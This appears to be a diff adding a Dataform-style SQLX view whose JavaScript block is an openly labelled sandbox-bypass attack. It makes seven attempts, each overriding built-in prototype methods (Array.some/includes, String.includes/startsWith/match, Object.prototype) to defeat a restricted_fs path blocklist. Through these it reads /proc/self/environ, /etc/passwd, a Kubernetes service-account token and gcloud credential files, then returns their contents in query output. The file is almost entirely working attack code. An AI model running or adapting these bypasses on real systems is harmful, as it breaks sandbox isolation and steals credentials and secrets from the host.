@@ -1,0 +1,189 @@
+-- Prototype Pollution → restricted_fs Bypass Attack
+-- Hypothesis: If restricted_fs uses JS blocklist checks like blockedPaths.some(),
+-- polluting Array.prototype.some or String.prototype methods bypasses the check.
+
+config {
+  type: "view",
+  name: "proto_bypass_attack"
+}
+
+js {
+  let results = [];
+
+  // Save original methods
+  const origArraySome = Array.prototype.some;
+  const origArrayIncludes = Array.prototype.includes;
+  const origStringIncludes = String.prototype.includes;
+  const origStringStartsWith = String.prototype.startsWith;
+  const origStringMatch = String.prototype.match;
+
+  // Target paths to read
+  const targetPaths = [
+    '/proc/self/environ',
+    '/etc/passwd',
+    '/etc/hosts',
+    '/proc/self/cmdline',
+    '/proc/self/cgroup',
+    '/run/secrets/kubernetes.io/serviceaccount/token',
+    '/root/.config/gcloud/application_default_credentials.json',
+    '/home/.config/gcloud/credentials.db'
+  ];
+
+  // ============================================
+  // ATTACK 1: Pollute Array.prototype.some
+  // Pattern: blockedPaths.some(p => path.startsWith(p))
+  // ============================================
+  results.push("=== ATTACK 1: Array.prototype.some ===");
+  Array.prototype.some = function() { return false; };
+
+  for (const p of targetPaths) {
+    try {
+      const content = restricted_fs.readFile(p);
+      results.push("SOME_BYPASS_SUCCESS: " + p + " len=" + content.length + " content=" + content.substring(0, 150).replace(/\n/g, '\\n'));
+    } catch(e) {
+      results.push("SOME_BYPASS_FAIL: " + p + " - " + e.message.substring(0, 80));
+    }
+  }
+  Array.prototype.some = origArraySome;
+
+  // ============================================
+  // ATTACK 2: Pollute Array.prototype.includes
+  // Pattern: blockedPaths.includes(path)
+  // ============================================
+  results.push("=== ATTACK 2: Array.prototype.includes ===");
+  Array.prototype.includes = function() { return false; };
+
+  for (const p of targetPaths.slice(0, 3)) {
+    try {
+      const content = restricted_fs.readFile(p);
+      results.push("INCL_BYPASS_SUCCESS: " + p + " len=" + content.length);
+    } catch(e) {
+      results.push("INCL_BYPASS_FAIL: " + p + " - " + e.message.substring(0, 80));
+    }
+  }
+  Array.prototype.includes = origArrayIncludes;
+
+  // ============================================
+  // ATTACK 3: Pollute String.prototype.includes
+  // Pattern: if (path.includes('/proc'))
+  // ============================================
+  results.push("=== ATTACK 3: String.prototype.includes ===");
+  String.prototype.includes = function(search) {
+    // Only bypass for blocked path patterns
+    if (search === '/proc' || search === '/etc' || search === '/sys' || search === '/run') {
+      return false;
+    }
+    return origStringIncludes.call(this, search);
+  };
+
+  for (const p of targetPaths.slice(0, 3)) {
+    try {
+      const content = restricted_fs.readFile(p);
+      results.push("STRINC_BYPASS_SUCCESS: " + p + " len=" + content.length);
+    } catch(e) {
+      results.push("STRINC_BYPASS_FAIL: " + p + " - " + e.message.substring(0, 80));
+    }
+  }
+  String.prototype.includes = origStringIncludes;
+
+  // ============================================
+  // ATTACK 4: Pollute String.prototype.startsWith
+  // Pattern: if (path.startsWith('/'))
+  // ============================================
+  results.push("=== ATTACK 4: String.prototype.startsWith ===");
+  String.prototype.startsWith = function(search) {
+    // Bypass root path checks
+    if (search === '/' || search === '/proc' || search === '/etc' || search === '/sys') {
+      return false;
+    }
+    return origStringStartsWith.call(this, search);
+  };
+
+  for (const p of targetPaths.slice(0, 3)) {
+    try {
+      const content = restricted_fs.readFile(p);
+      results.push("STARTS_BYPASS_SUCCESS: " + p + " len=" + content.length);
+    } catch(e) {
+      results.push("STARTS_BYPASS_FAIL: " + p + " - " + e.message.substring(0, 80));
+    }
+  }
+  String.prototype.startsWith = origStringStartsWith;
+
+  // ============================================
+  // ATTACK 5: Pollute String.prototype.match
+  // Pattern: if (path.match(/^\/proc|^\/etc/))
+  // ============================================
+  results.push("=== ATTACK 5: String.prototype.match ===");
+  String.prototype.match = function(pattern) {
+    // If matching blocked path patterns, return null (no match)
+    if (pattern && pattern.source && (
+        pattern.source.includes('proc') ||
+        pattern.source.includes('etc') ||
+        pattern.source.includes('sys'))) {
+      return null;
+    }
+    return origStringMatch.call(this, pattern);
+  };
+
+  for (const p of targetPaths.slice(0, 3)) {
+    try {
+      const content = restricted_fs.readFile(p);
+      results.push("MATCH_BYPASS_SUCCESS: " + p + " len=" + content.length);
+    } catch(e) {
+      results.push("MATCH_BYPASS_FAIL: " + p + " - " + e.message.substring(0, 80));
+    }
+  }
+  String.prototype.match = origStringMatch;
+
+  // ============================================
+  // ATTACK 6: Combined pollution (all methods)
+  // ============================================
+  results.push("=== ATTACK 6: Combined Pollution ===");
+  Array.prototype.some = function() { return false; };
+  Array.prototype.includes = function() { return false; };
+  String.prototype.includes = function() { return false; };
+  String.prototype.startsWith = function() { return false; };
+  String.prototype.match = function() { return null; };
+
+  for (const p of targetPaths) {
+    try {
+      const content = restricted_fs.readFile(p);
+      results.push("COMBO_BYPASS_SUCCESS: " + p + " len=" + content.length + " start=" + content.substring(0, 100).replace(/\n/g, '\\n'));
+    } catch(e) {
+      results.push("COMBO_BYPASS_FAIL: " + p + " - " + e.message.substring(0, 80));
+    }
+  }
+
+  // Restore all
+  Array.prototype.some = origArraySome;
+  Array.prototype.includes = origArrayIncludes;
+  String.prototype.includes = origStringIncludes;
+  String.prototype.startsWith = origStringStartsWith;
+  String.prototype.match = origStringMatch;
+
+  // ============================================
+  // ATTACK 7: Pollute BEFORE restricted_fs is accessed
+  // Try to affect the module itself
+  // ============================================
+  results.push("=== ATTACK 7: Object.prototype pollution ===");
+  try {
+    // Pollute Object.prototype to inject properties
+    Object.prototype.allowed = true;
+    Object.prototype.bypass = true;
+    Object.prototype.isAllowed = function() { return true; };
+
+    const content = restricted_fs.readFile('/proc/self/environ');
+    results.push("OBJPROTO_SUCCESS: /proc/self/environ len=" + content.length);
+
+    delete Object.prototype.allowed;
+    delete Object.prototype.bypass;
+    delete Object.prototype.isAllowed;
+  } catch(e) {
+    results.push("OBJPROTO_FAIL: " + e.message.substring(0, 80));
+    delete Object.prototype.allowed;
+    delete Object.prototype.bypass;
+    delete Object.prototype.isAllowed;
+  }
+}
+
+SELECT '${JSON.stringify(results)}' as bypass_results
